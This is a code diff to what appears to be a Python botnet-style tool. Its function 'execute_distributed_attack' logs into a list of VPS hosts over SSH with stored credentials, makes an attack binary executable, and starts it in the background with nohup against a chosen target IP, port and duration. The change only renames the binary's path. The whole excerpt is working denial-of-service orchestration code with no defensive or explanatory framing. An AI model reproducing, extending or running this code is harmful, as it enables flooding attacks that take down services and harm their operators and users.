@@ -281,7 +281,7 @@ def execute_distributed_attack(vps_list, target_ip, target_port, duration, progr
     for index, (ip, details) in enumerate(vps_list, start=1):
         try:
             # Verify binary exists and is executable
-            check_cmd = "test -f /home/master/freeroot/root/flash && echo 'exists' || echo 'missing'"
+            check_cmd = "test -f /home/master/X2/golemxtop && echo 'exists' || echo 'missing'"
             status, output = ssh_execute(ip, details['username'], details['password'], check_cmd)
             
             if not status or 'missing' in output:
@@ -290,10 +290,10 @@ def execute_distributed_attack(vps_list, target_ip, target_port, duration, progr
                 continue
                 
             # Make executable if not already
-            ssh_execute(ip, details['username'], details['password'], "chmod +x /home/master/freeroot/root/smokey")
+            ssh_execute(ip, details['username'], details['password'], "chmod +x /home/master/X2/golemxtop")
             
             # Execute attack using configured thread count
-            attack_cmd = f"nohup /home/master/freeroot/root/smokey {target_ip} {target_port} {duration} {THREADS_PER_VPS} >/dev/null 2>&1 &"
+            attack_cmd = f"nohup /home/master/X2/golemxtop {target_ip} {target_port} {duration} {THREADS_PER_VPS} >/dev/null 2>&1 &"
             status, output = ssh_execute(ip, details['username'], details['password'], attack_cmd)
             
             if status:
